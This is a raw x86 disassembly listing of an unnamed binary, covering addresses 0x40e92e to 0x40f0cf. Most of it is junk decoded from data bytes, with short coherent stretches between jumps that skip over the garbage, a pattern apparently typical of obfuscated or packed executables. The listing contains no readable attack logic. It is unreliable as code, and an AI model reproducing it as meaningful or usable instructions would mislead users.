  40e92e:	mov    DWORD PTR ds:0x42e80b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	hlt    
  40e94a:	mov    DWORD PTR [ebp+0x70a024f5],ebp
  40e950:	jo     0x40e915
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e955
  40e956:	arpl   WORD PTR [esi],cx
  40e958:	push   eax
  40e959:	test   eax,0x7825427d
  40e95e:	sub    DWORD PTR [esi-0x5f4330cc],eax
  40e964:	not    DWORD PTR [ebp+0x7b]
  40e967:	ss pop eax
  40e969:	push   ecx
  40e96a:	mov    DWORD PTR [eax+0x5c994bb9],ebx
  40e970:	mov    al,ds:0xdf2af1d7
  40e975:	sbb    eax,0xf4439085
  40e97a:	xchg   esp,eax
  40e97b:	cmp    DWORD PTR [esi+0x7e],edi
  40e97e:	punpckhwd xmm2,XMMWORD PTR [ecx-0x33]
  40e983:	sbb    eax,0x49b5de51
  40e988:	sub    cl,BYTE PTR [eax]
  40e98a:	and    DWORD PTR [ebx],edx
  40e98c:	dec    edi
  40e98d:	xchg   ecx,eax
  40e98e:	fbld   TBYTE PTR [edi+ecx*4]
  40e991:	cld    
  40e992:	fwait
  40e993:	push   ds
  40e994:	cmp    eax,0x7a6aedb7
  40e999:	retf   0x946e
  40e99c:	inc    ebp
  40e99d:	hlt    
  40e99e:	int3   
  40e99f:	out    0xcf,al
  40e9a1:	mov    bl,0xbb
  40e9a3:	inc    eax
  40e9a4:	push   ds
  40e9a5:	outs   dx,DWORD PTR ds:[esi]
  40e9a6:	mov    ebp,0xb6e3744e
  40e9ab:	out    0xf9,eax
  40e9ad:	mov    BYTE PTR [edi-0x3de9f5ae],dh
  40e9b3:	mov    eax,ds:0x3cb97cdb
  40e9b8:	mov    al,ds:0xa2d9d074
  40e9bd:	xchg   esi,eax
  40e9bf:	jnp    0x40e979
  40e9c1:	dec    edi
  40e9c2:	xchg   edx,eax
  40e9c3:	and    eax,0x26513eb1
  40e9c8:	mov    eax,0x3e146a39
  40e9cd:	in     eax,0x3e
  40e9cf:	add    esi,DWORD PTR [ebp+0x446eb031]
  40e9d5:	sahf   
  40e9d6:	sti    
  40e9d7:	in     al,0xe3
  40e9d9:	imul   edi,DWORD PTR [eax],0x2d
  40e9dc:	xchg   esp,eax
  40e9dd:	lock push cs
  40e9df:	nop
  40e9e0:	or     al,0xf7
  40e9e2:	cmp    al,0xdb
  40e9e4:	pop    ss
  40e9e5:	inc    esp
  40e9e6:	mov    DWORD PTR [ebp-0x5bf30546],ecx
  40e9ec:	xchg   dl,ah
  40e9ee:	imul   ecx,DWORD PTR cs:[edi-0x68092ce9],0xffffffd5
  40e9f6:	test   eax,0xd1091dcc
  40e9fb:	mov    BYTE PTR [edx+ebx*4+0x35],cl
  40e9ff:	xchg   esi,eax
  40ea00:	and    DWORD PTR [edx-0x16437f28],esp
  40ea06:	xchg   ebx,eax
  40ea07:	xlat   BYTE PTR ds:[ebx]
  40ea08:	repz popa 
  40ea0a:	clc    
  40ea0b:	xlat   BYTE PTR ds:[ebx]
  40ea0c:	stos   DWORD PTR es:[edi],eax
  40ea0d:	mov    DWORD PTR [ebx],ecx
  40ea0f:	test   esp,esi
  40ea11:	inc    edi
  40ea12:	fbld   TBYTE PTR [ecx]
  40ea14:	leave  
  40ea15:	cmp    DWORD PTR [ebx+0x25],esp
  40ea18:	add    DWORD PTR [ecx],0xffffff88
  40ea1b:	fisttp QWORD PTR [esi]
  40ea1d:	pop    eax
  40ea1e:	jae    0x40ea24
  40ea20:	jb     0x40ea80
  40ea22:	popa   
  40ea23:	ror    BYTE PTR [ecx],0xe1
  40ea26:	mov    ah,0xdd
  40ea28:	stc    
  40ea29:	out    0x24,eax
  40ea2b:	add    DWORD PTR [edi+0xf],esi
  40ea2e:	mov    esp,0x10db4c66
  40ea33:	jmp    0x40ea2a
  40ea35:	xchg   ecx,eax
  40ea36:	push   eax
  40ea37:	mov    edx,0x90290066
  40ea3c:	loop   0x40ea52
  40ea3e:	nop
  40ea3f:	jmp    0x40eaa6
  40ea41:	std    
  40ea42:	rcl    DWORD PTR [esi+edi*8+0x47],cl
  40ea46:	adc    cl,bl
  40ea48:	pushf  
  40ea49:	aas    
  40ea4a:	mov    ah,0xb5
  40ea4c:	mov    edx,0x5cba7073
  40ea51:	mov    edi,0xba9ea680
  40ea56:	cwde   
  40ea57:	dec    edx
  40ea58:	add    eax,0xce81c274
  40ea5d:	ret    
  40ea5e:	icebp  
  40ea5f:	es out dx,al
  40ea61:	jne    0x40ea84
  40ea63:	ins    DWORD PTR es:[edi],dx
  40ea64:	clc    
  40ea65:	rcr    BYTE PTR [ebx+0x4e],0x8b
  40ea69:	push   cs
  40ea6a:	icebp  
  40ea6b:	lds    esp,FWORD PTR [esi-0x73]
  40ea6e:	scas   al,BYTE PTR es:[edi]
  40ea6f:	test   eax,0x5d602554
  40ea74:	fidivr WORD PTR [edi+esi*2-0x6896ebb8]
  40ea7b:	icebp  
  40ea7c:	mov    ds:0xd3f0ac1c,al
  40ea81:	xlat   BYTE PTR ds:[ebx]
  40ea82:	outs   dx,DWORD PTR ds:[esi]
  40ea83:	mov    edi,0x9a9dca39
  40ea88:	inc    esi
  40ea89:	xchg   ebx,eax
  40ea8a:	pop    edx
  40ea8b:	cmp    al,0x6
  40ea8d:	mov    al,ds:0xa70671e9
  40ea92:	call   0x9897:0x1a1a397d
  40ea99:	add    eax,0x8bd0c2e9
  40ea9e:	stos   WORD PTR es:[edi],ax
  40eaa0:	fild   DWORD PTR [ebx+0xa6850f]
  40eaa6:	add    BYTE PTR [eax],al
  40eaa8:	add    ecx,edx
  40eaaa:	mov    eax,DWORD PTR [ebp+0x8]
  40eaad:	sbb    ecx,0x443c
  40eab3:	mov    ecx,DWORD PTR [ebp-0x10]
  40eab6:	adc    edx,DWORD PTR ds:0x42fde5
  40eabc:	xor    eax,esi
  40eabe:	add    eax,edi
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e228,0x11
  40eade:	cmp    DWORD PTR ds:0x42e228,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e228,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e230
  40eafd:	push   0x42e26f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e40f
  40eb15:	cmp    DWORD PTR ds:0x42e228,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e228
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e228,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e228
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e228,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x55
  40eb8d:	xchg   edi,eax
  40eb8e:	mov    al,ds:0x70aff7e5
  40eb93:	jo     0x40eb58
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40eba3
  40eb99:	mov    ah,0xdc
  40eb9b:	sub    ah,BYTE PTR [edi]
  40eb9d:	push   ecx
  40eb9e:	mov    cs,ecx
  40eba0:	push   0x3
  40eba2:	loope  0x40ebd0
  40eba4:	mov    WORD PTR [edx],?
  40eba6:	inc    DWORD PTR [edi]
  40eba8:	mov    esi,0xb2dfe9fc
  40ebad:	xlat   BYTE PTR ds:[ebx]
  40ebae:	cmp    eax,0xbc42a80e
  40ebb3:	or     eax,DWORD PTR [ebp-0x4f]
  40ebb6:	mov    BYTE PTR [edx],dl
  40ebb8:	dec    ecx
  40ebb9:	cmp    dh,BYTE PTR [ebx+0x74e01336]
  40ebbf:	gs pop esi
  40ebc1:	fnstsw WORD PTR [edx-0x25]
  40ebc4:	(bad)  
  40ebc5:	popa   
  40ebc6:	add    ch,0xea
  40ebc9:	mov    esi,0xabec22a7
  40ebce:	imul   ecx,DWORD PTR ds:0xa3dfb4e1,0x8afb5c46
  40ebd8:	ss call 0xa1d5:0x4314
  40ebdf:	sbb    BYTE PTR [ebx-0x289132ae],dh
  40ebe5:	mov    WORD PTR [esi-0x78],es
  40ebe8:	sar    eax,cl
  40ebea:	dec    ecx
  40ebeb:	shl    edi,cl
  40ebed:	jno    0x40ec3c
  40ebef:	and    BYTE PTR [edx+0x17],dh
  40ebf2:	es sbb al,0x82
  40ebf5:	inc    esp
  40ebf6:	js     0x40ebb4
  40ebf8:	test   al,0x70
  40ebfa:	lahf   
  40ebfb:	mov    esi,0x6cae697f
  40ec00:	xchg   dh,bh
  40ec02:	and    al,0x2f
  40ec04:	mov    esi,0xbe517af5
  40ec09:	jge    0x40ebc7
  40ec0b:	dec    BYTE PTR [esi]
  40ec0d:	sub    edx,DWORD PTR [ebx-0x5f51999d]
  40ec13:	jge    0x40ec74
  40ec15:	push   edi
  40ec16:	retf   0x1aea
  40ec19:	push   ss
  40ec1a:	in     eax,dx
  40ec1b:	mov    ecx,DWORD PTR [edx+0x11]
  40ec1e:	mov    dh,0xb3
  40ec20:	cmp    al,BYTE PTR ds:0xb8bc30cd
  40ec26:	pop    eax
  40ec27:	pop    ss
  40ec28:	out    0x35,eax
  40ec2a:	repz adc edx,DWORD PTR [ebx+0x61525114]
  40ec31:	pop    ebx
  40ec32:	sub    edi,DWORD PTR [esi-0x29]
  40ec35:	pop    esi
  40ec36:	dec    ebp
  40ec37:	sub    BYTE PTR [edi],0x7d
  40ec3a:	dec    DWORD PTR [eax+ebx*1]
  40ec3d:	or     edx,0x8b6eedb9
  40ec43:	outs   dx,BYTE PTR ds:[esi]
  40ec44:	mov    eax,0x313a40d8
  40ec49:	fcom   QWORD PTR [ebp+0x3f]
  40ec4c:	cdq    
  40ec4d:	jno    0x40ecae
  40ec4f:	fsub   QWORD PTR [ebx-0x352a05be]
  40ec55:	pop    es
  40ec56:	dec    ecx
  40ec57:	les    esp,FWORD PTR [edx+0x145b2302]
  40ec5d:	cmp    eax,0x93447285
  40ec62:	push   es
  40ec63:	push   eax
  40ec64:	out    dx,al
  40ec65:	or     BYTE PTR [ebx],bl
  40ec67:	in     eax,0x51
  40ec69:	xor    ch,BYTE PTR [edx]
  40ec6b:	sbb    BYTE PTR [ebp+0x58],cl
  40ec6e:	adc    al,0x46
  40ec70:	shl    ebp,1
  40ec72:	mov    al,0xed
  40ec74:	out    0x14,eax
  40ec76:	xor    DWORD PTR [ebx+0x27],edi
  40ec79:	cmp    DWORD PTR [ebx],edx
  40ec7b:	in     al,0xf8
  40ec7d:	xor    al,ah
  40ec7f:	mov    ebx,0x791b4f2a
  40ec84:	dec    edi
  40ec85:	push   edx
  40ec86:	fucompp 
  40ec88:	lods   al,BYTE PTR ds:[esi]
  40ec89:	repz mov eax,DWORD PTR [ebx]
  40ec8c:	sar    dh,0xab
  40ec8f:	mov    ecx,0x90a45bed
  40ec94:	lods   eax,DWORD PTR ds:[esi]
  40ec95:	xor    DWORD PTR [ebx+0x9],edx
  40ec98:	lahf   
  40ec99:	jmp    0x40ec38
  40ec9b:	pop    ds
  40ec9c:	dec    edi
  40ec9d:	mov    BYTE PTR [ecx-0x4b113c2c],bl
  40eca3:	mov    dl,0xe5
  40eca5:	jb     0x40ed07
  40eca7:	mov    dh,0xd5
  40eca9:	je     0x40ed23
  40ecab:	push   ss
  40ecac:	xchg   ebp,eax
  40ecad:	outs   dx,DWORD PTR ds:[esi]
  40ecae:	mov    cl,0xfe
  40ecb0:	sbb    eax,0x46eb57e9
  40ecb5:	ret    0x9968
  40ecb8:	adc    BYTE PTR [esi+edx*8],ch
  40ecbb:	mov    BYTE PTR [ecx+0x6be64b08],ah
  40ecc1:	loopne 0x40ecf0
  40ecc3:	add    bh,BYTE PTR ds:0x2f369302
  40ecc9:	mov    ?,WORD PTR [eax-0x51ff269b]
  40eccf:	aam    0xa4
  40ecd1:	sbb    bl,al
  40ecd3:	xor    eax,0x71255a23
  40ecd8:	push   ebx
  40ecd9:	jno    0x40ec69
  40ecdb:	xchg   edx,eax
  40ecdc:	mov    ch,0x73
  40ecde:	mov    esp,0xb6b21d86
  40ece3:	jmp    0x40ed09
  40ece5:	cmp    eax,ecx
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ed43
  40ed00:	xor    BYTE PTR [ebx-0x23],dl
  40ed03:	mov    edx,0xc37070ae
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed89
  40ed0c:	or     eax,0xc603f9b9
  40ed11:	repnz mov ebx,0x280fe137
  40ed17:	dec    ebx
  40ed18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed19:	push   edi
  40ed1a:	jg     0x40ed07
  40ed1c:	ror    BYTE PTR [ebp-0x53],0x10
  40ed20:	jge    0x40ed48
  40ed22:	int3   
  40ed23:	popa   
  40ed24:	sub    eax,0x22d0ff91
  40ed29:	xlat   BYTE PTR ds:[ebx]
  40ed2a:	mov    edi,DWORD PTR [ecx-0x2b231736]
  40ed30:	dec    esi
  40ed31:	mov    cl,BYTE PTR [ebx-0x70a7dbb2]
  40ed37:	jle    0x40ed0d
  40ed39:	dec    edx
  40ed3a:	test   al,0x15
  40ed3c:	dec    edi
  40ed3d:	fistp  QWORD PTR [eax-0x6d]
  40ed40:	and    esp,eax
  40ed42:	xchg   ecx,eax
  40ed43:	outs   dx,DWORD PTR ds:[esi]
  40ed44:	ja     0x40ed40
  40ed46:	add    eax,0x441edf72
  40ed4b:	stc    
  40ed4c:	lea    ebp,[ecx]
  40ed4e:	ds sub dh,dh
  40ed51:	cmp    eax,DWORD PTR [eax]
  40ed53:	mov    dh,0x71
  40ed56:	pop    ds
  40ed57:	loope  0x40ed61
  40ed59:	sub    BYTE PTR [esi+0x3],dh
  40ed5c:	push   ecx
  40ed5d:	test   ah,bl
  40ed5f:	pop    ds
  40ed60:	ja     0x40edb2
  40ed62:	loope  0x40ede2
  40ed64:	mov    al,ds:0x3ebe7029
  40ed69:	aaa    
  40ed6a:	inc    edx
  40ed6b:	out    0x7a,eax
  40ed6d:	fdivr  DWORD PTR [eax+0x31ed11c1]
  40ed73:	jle    0x40eda4
  40ed75:	sbb    al,0x33
  40ed77:	add    al,ch
  40ed79:	cmp    DWORD PTR [eax-0x2615cbc8],ebp
  40ed7f:	fisub  DWORD PTR [eax+ebx*1-0x66]
  40ed83:	and    ebx,DWORD PTR [edi]
  40ed85:	push   eax
  40ed86:	mov    cl,bl
  40ed88:	outs   dx,BYTE PTR ds:[esi]
  40ed89:	outs   dx,DWORD PTR ds:[esi]
  40ed8a:	mov    WORD PTR [ebx],cs
  40ed8c:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed8e:	add    edx,DWORD PTR [ebx+0x5]
  40ed91:	hlt    
  40ed92:	fnstenv [ecx+0x26]
  40ed95:	or     dh,BYTE PTR [ebx+0x39]
  40ed98:	stos   DWORD PTR es:[edi],eax
  40ed99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed9a:	adc    al,ch
  40ed9c:	mov    eax,ds:0xa0bf5142
  40eda1:	cmp    bh,BYTE PTR [esp+eax*8]
  40eda4:	sbb    DWORD PTR [edi+eax*4-0x58],ecx
  40eda8:	aad    0xd7
  40edaa:	xor    al,0xa
  40edac:	xor    cl,BYTE PTR [edx]
  40edae:	sbb    al,cl
  40edb0:	xchg   esi,eax
  40edb1:	inc    eax
  40edb2:	or     ebx,DWORD PTR [edx]
  40edb4:	cmc    
  40edb5:	xchg   cl,bh
  40edb7:	jnp    0x40ed82
  40edb9:	add    al,0xbb
  40edbb:	stc    
  40edbc:	mov    edi,0x5add89dd
  40edc1:	fimul  DWORD PTR [edi]
  40edc3:	jns    0x40edd0
  40edc5:	inc    edx
  40edc6:	sub    al,0x79
  40edc8:	test   al,0x72
  40edca:	stos   BYTE PTR es:[edi],al
  40edcb:	or     bh,al
  40edcd:	push   0xbff5a056
  40edd2:	in     al,dx
  40edd3:	out    0x1b,al
  40edd5:	nop
  40edd6:	sub    BYTE PTR [esi+0x17999e96],0xa3
  40eddd:	addr16 push esi
  40eddf:	test   eax,0xcb4e7202
  40ede4:	mov    ?,WORD PTR [ecx-0xcd43f]
  40edea:	out    0x20,al
  40edec:	push   ds
  40eded:	loop   0x40edf2
  40edef:	fisttp QWORD PTR [edi-0x4d]
  40edf2:	sub    DWORD PTR [eax-0x6e],ebx
  40edf5:	xchg   esp,eax
  40edf6:	add    ah,BYTE PTR [di-0x8]
  40edfa:	arpl   dx,dx
  40edfc:	sub    BYTE PTR [ecx-0x45c307de],cl
  40ee02:	bt     DWORD PTR [edi+0x21],esi
  40ee06:	dec    esi
  40ee07:	cmp    dl,BYTE PTR [ebp+0x5a]
  40ee0a:	mov    ebx,0x8cc0fd3d
  40ee0f:	push   ebx
  40ee10:	adc    ch,al
  40ee12:	jno    0x40ee1d
  40ee14:	addr16 pop ebx
  40ee16:	or     DWORD PTR [edx+0x46c301ae],edi
  40ee1c:	ja     0x40edf4
  40ee1e:	jge    0x40ee91
  40ee20:	scas   al,BYTE PTR es:[edi]
  40ee21:	es cli 
  40ee23:	and    eax,0x77c0cbfa
  40ee28:	xchg   edx,eax
  40ee29:	cld    
  40ee2a:	inc    edx
  40ee2b:	aas    
  40ee2c:	das    
  40ee2d:	dec    edi
  40ee2e:	pop    es
  40ee2f:	lea    edi,[ebx]
  40ee31:	xchg   bh,ah
  40ee33:	or     DWORD PTR [edx+ecx*8+0x75],edx
  40ee37:	push   edi
  40ee38:	cmc    
  40ee39:	sub    al,0xe1
  40ee3b:	jnp    0x40ee39
  40ee3d:	push   esp
  40ee3e:	and    BYTE PTR [edi-0x1aa7b341],ch
  40ee44:	sti    
  40ee45:	sti    
  40ee46:	push   eax
  40ee47:	loop   0x40ee48
  40ee49:	cs mov dl,0x1d
  40ee4c:	sbb    al,0x7e
  40ee4e:	jge    0x40ee56
  40ee50:	sti    
  40ee51:	enter  0xfefc,0x62
  40ee55:	xor    eax,0x8f0f8f76
  40ee5a:	jns    0x40ee5d
  40ee5c:	add    BYTE PTR [eax],al
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x5b
  40ee7f:	les    esp,FWORD PTR [ebx]
  40ee81:	pop    esi
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ef03
  40ee8b:	es aam 0x2
  40ee8e:	add    al,0x61
  40ee90:	or     al,0x44
  40ee92:	pop    ds
  40ee93:	retf   0xd612
  40ee96:	lods   al,BYTE PTR ds:[esi]
  40ee97:	xor    edx,ecx
  40ee99:	cmp    DWORD PTR [edi+0x1c32eed9],eax
  40ee9f:	mov    eax,ds:0xbc34812d
  40eea4:	aas    
  40eea5:	leave  
  40eea6:	lahf   
  40eea7:	xor    al,0x6
  40eea9:	retf   
  40eeaa:	leave  
  40eeab:	push   0x355489f1
  40eeb0:	imul   ebp,DWORD PTR [ecx-0x71],0x42bde829
  40eeb7:	jmp    0x40ee81
  40eeb9:	mov    ch,0xfe
  40eebb:	cmp    al,0x65
  40eebd:	imul   esp,DWORD PTR [ebp-0x10],0xa1f9b251
  40eec4:	inc    esi
  40eec5:	cmp    eax,0xd8469f06
  40eeca:	iret   
  40eecb:	popf   
  40eecc:	jne    0x40ef40
  40eece:	call   edi
  40eed0:	sub    BYTE PTR [eax],bh
  40eed2:	retf   
  40eed3:	sbb    ebp,DWORD PTR ds:0x25468cbb
  40eed9:	int    0xf9
  40eedb:	xchg   ah,dh
  40eedd:	and    al,0x50
  40eedf:	cmp    DWORD PTR [esi],ebx
  40eee1:	rol    edi,1
  40eee3:	(bad)  
  40eee4:	clc    
  40eee5:	fwait
  40eee6:	stc    
  40eee7:	mov    eax,fs
  40eee9:	jne    0x40ef51
  40eeeb:	jmp    0xe31defd0
  40eef0:	inc    ebp
  40eef1:	xchg   edi,eax
  40eef2:	call   0x13b2:0x34ef7d30
  40eef9:	mov    edx,0x532d9a85
  40eefe:	mov    BYTE PTR [esi],al
  40ef00:	sbb    al,BYTE PTR [ebx-0x37]
  40ef03:	and    bh,cl
  40ef05:	mov    cl,0xc6
  40ef07:	les    edx,FWORD PTR [eax-0x5cc4f475]
  40ef0d:	inc    ecx
  40ef0e:	ror    DWORD PTR [edi+0x7d],0x80
  40ef12:	jg     0x40ef50
  40ef14:	mov    ebx,0xcb418280
  40ef19:	imul   edx,DWORD PTR [edx-0x74a534d5],0xffffffde
  40ef20:	int    0xbd
  40ef22:	sub    ecx,DWORD PTR [esi+0x378aaeaa]
  40ef28:	jmp    0x5bdf:0xc5ea01cb
  40ef2f:	fstp   DWORD PTR [eax+ebp*2+0x423f6a3e]
  40ef36:	outs   dx,DWORD PTR ds:[esi]
  40ef37:	lahf   
  40ef38:	xchg   ebp,eax
  40ef39:	lods   al,BYTE PTR ds:[esi]
  40ef3a:	jmp    0x963b:0x800bc8de
  40ef41:	inc    ebp
  40ef42:	lahf   
  40ef43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef44:	(bad)  
  40ef45:	aam    0xf7
  40ef47:	xor    ecx,DWORD PTR [ecx]
  40ef49:	jp     0x40eefd
  40ef4b:	push   eax
  40ef4c:	add    DWORD PTR [esi],ebp
  40ef4e:	inc    edi
  40ef4f:	push   eax
  40ef50:	lock out dx,eax
  40ef52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef53:	jmp    0xb0c4:0x6ca73e01
  40ef5a:	in     al,0xdb
  40ef5c:	es mov ss:0xd3fb77f9,eax
  40ef63:	loop   0x40ef2d
  40ef65:	or     al,0x8d
  40ef67:	mov    esp,0xe2a176dd
  40ef6c:	loop   0x40ef30
  40ef6e:	pop    ebx
  40ef6f:	cs ins DWORD PTR es:[edi],dx
  40ef71:	leave  
  40ef72:	psubsb mm4,QWORD PTR [ecx+0x6e08a1d]
  40ef79:	test   BYTE PTR [edi-0x7da8f75d],dh
  40ef7f:	add    bh,BYTE PTR [esi-0x34]
  40ef82:	pop    ss
  40ef83:	xchg   DWORD PTR [edx+ecx*4+0x6a],ecx
  40ef87:	aad    0xed
  40ef89:	scas   al,BYTE PTR es:[edi]
  40ef8a:	add    BYTE PTR [eax],al
  40ef8c:	loope  0x40ef46
  40ef8e:	sbb    al,0x15
  40ef90:	push   edx
  40ef91:	and    dl,BYTE PTR [esi]
  40ef93:	mov    bh,0xcf
  40ef95:	push   es
  40ef96:	or     DWORD PTR [eax*4-0x797860dd],esp
  40ef9d:	loop   0x40efd0
  40ef9f:	popf   
  40efa0:	cdq    
  40efa1:	lds    esi,FWORD PTR [ebx]
  40efa3:	sahf   
  40efa4:	hlt    
  40efa5:	retf   
  40efa6:	aam    0x3e
  40efa8:	pop    ebx
  40efa9:	adc    BYTE PTR [eax],ch
  40efab:	inc    ebp
  40efac:	and    DWORD PTR [edi+0x24],ebx
  40efaf:	and    eax,0x8ee29868
  40efb4:	mov    esi,0x6d325925
  40efb9:	out    dx,al
  40efba:	popf   
  40efbb:	pusha  
  40efbc:	iret   
  40efbd:	ds or  edi,edx
  40efc0:	xchg   esi,eax
  40efc1:	fadd   DWORD PTR [ebx]
  40efc3:	pushf  
  40efc4:	cmc    
  40efc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efc6:	out    dx,eax
  40efc7:	adc    DWORD PTR [ecx+0xb891305],esp
  40efcd:	mov    gs,WORD PTR [eax]
  40efcf:	loop   0x40efbc
  40efd1:	xor    BYTE PTR [esi],cl
  40efd3:	rcl    BYTE PTR gs:0x8dc633a9,0x84
  40efdb:	or     BYTE PTR [edx+esi*2-0x7699ffce],bl
  40efe2:	inc    ebp
  40efe3:	cld    
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	inc    ebp
  40effb:	mov    esi,DWORD PTR [ecx+0x70abd074]
  40f001:	jo     0x40efc6
  40f003:	jg     0x40f075
  40f005:	jo     0x40efc6
  40f007:	(bad)  [ebx-0x20f4f2ea]
  40f00d:	fldcw  WORD PTR [ecx+edx*8+0x47fb490b]
  40f014:	rcl    DWORD PTR [eax+0x27],cl
  40f017:	pusha  
  40f018:	outs   dx,BYTE PTR ds:[esi]
  40f019:	popf   
  40f01a:	addr16 mov dl,0x31
  40f01d:	repz or eax,DWORD PTR [ebx]
  40f020:	lahf   
  40f021:	pop    ebp
  40f022:	repz cmc 
  40f024:	xchg   ecx,eax
  40f025:	fbstp  TBYTE PTR ds:0x1092acd5
  40f02b:	jmp    0xc286:0xde31c45c
  40f032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f033:	jb     0x40f095
  40f035:	jo     0x40f00f
  40f037:	push   edi
  40f038:	add    eax,0x20d4d334
  40f03d:	cmp    al,0xd2
  40f03f:	(bad)
  40f042:	aas    
  40f043:	ja     0x40f07c
  40f045:	clc    
  40f046:	mov    edi,ebx
  40f048:	sub    al,0x38
  40f04a:	not    esi
  40f04c:	xchg   ebx,eax
  40f04d:	jae    0x40f0a0
  40f04f:	scas   eax,DWORD PTR es:[edi]
  40f050:	(bad)  
  40f051:	clc    
  40f052:	mul    DWORD PTR [ebx-0x3]
  40f055:	iret   
  40f056:	sbb    al,0x94
  40f058:	mov    esi,0xd5a3027
  40f05d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f05e:	scas   al,BYTE PTR es:[edi]
  40f05f:	adc    BYTE PTR [edi],al
  40f061:	imul   ebp,DWORD PTR [edi+0x1b8ff91],0x7e
  40f068:	arpl   WORD PTR [ecx],ax
  40f06a:	adc    eax,0x744b3534
  40f06f:	sbb    esp,DWORD PTR [ecx+0x6d9a2b73]
  40f075:	jb     0x40efff
  40f077:	loopne 0x40eff9
  40f079:	mov    bl,0x9d
  40f07b:	cmp    eax,0x781ea0d3
  40f080:	inc    ebp
  40f081:	es jne 0x40f0cc
  40f084:	shl    BYTE PTR [ebx-0x41f53c76],cl
  40f08a:	xor    DWORD PTR [di],eax
  40f08d:	mov    ah,0xff
  40f08f:	add    BYTE PTR [eax+eiz*1+0x69a74a66],al
  40f096:	aad    0x3
  40f098:	push   0xf
  40f09a:	addr16 retf 0x5702
  40f09e:	and    dl,dh
  40f0a0:	xor    al,0x4
  40f0a2:	fldenv [edx]
  40f0a4:	jl     0x40f0b7
  40f0a6:	test   al,0xdd
  40f0a8:	int3   
  40f0a9:	adc    ecx,DWORD PTR [edx+edi*4]
  40f0ac:	sbb    cl,BYTE PTR [esi]
  40f0ae:	jns    0x40f0c2
  40f0b0:	jle    0x40f066
  40f0b2:	cmp    esi,edx
  40f0b4:	dec    esp
  40f0b5:	or     ebp,edx
  40f0b7:	cmp    BYTE PTR [edx],cl
  40f0b9:	inc    eax
  40f0ba:	sbb    al,BYTE PTR es:[ecx+eiz*4+0x6a]
  40f0bf:	gs pop es
  40f0c1:	pop    ebx
  40f0c2:	ret    
  40f0c3:	aaa    
  40f0c4:	adc    esi,ebx
  40f0c6:	inc    ecx
  40f0c7:	into   
  40f0c8:	dec    esi
  40f0c9:	lods   eax,DWORD PTR ds:[esi]
  40f0ca:	mov    ds:0xfe2ebd28,eax
  40f0cf:	pop    ecx
